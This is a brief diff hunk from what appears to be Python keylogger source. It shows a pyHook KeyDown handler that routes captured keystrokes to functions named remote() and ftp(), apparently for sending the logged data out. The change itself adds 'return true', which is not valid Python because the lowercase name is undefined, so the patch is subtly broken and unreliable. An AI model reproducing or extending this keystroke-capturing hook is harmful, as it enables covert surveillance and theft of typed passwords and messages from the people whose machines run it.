@@ -231,6 +231,7 @@ def keypressed(event):
         remote()
     elif x==4:
         ftp()
+    return true
 
 obj = pyHook.HookManager()
 obj.KeyDown = keypressed
